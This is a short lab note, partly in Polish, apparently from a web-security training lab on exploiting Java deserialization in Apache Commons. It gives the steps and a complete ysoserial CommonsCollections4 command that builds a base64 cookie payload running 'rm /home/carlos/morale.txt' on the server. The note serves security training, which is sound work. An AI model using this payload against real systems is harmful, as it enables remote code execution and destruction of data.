@@ -1,0 +1,23 @@
+Lab: Exploiting Java deserialization with Apache Commons
+
+1. login observe session cookie (url encoded > base64 > access token)
+2. ysoserial
+3. payload bedzie w base64, wiec po wklejeniu do ciasteczka dodać url encoded
+4. odpowiedz servera 500 = solved
+
+__
+check: 
+
+java -version
+(21.0.7 więc używam komendy z -add-opens)
+
+___
+payload:
+
+java \
+  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
+  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
+  --add-opens=java.base/java.net=ALL-UNNAMED \
+  --add-opens=java.base/java.util=ALL-UNNAMED \
+  -jar ysoserial.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0
+
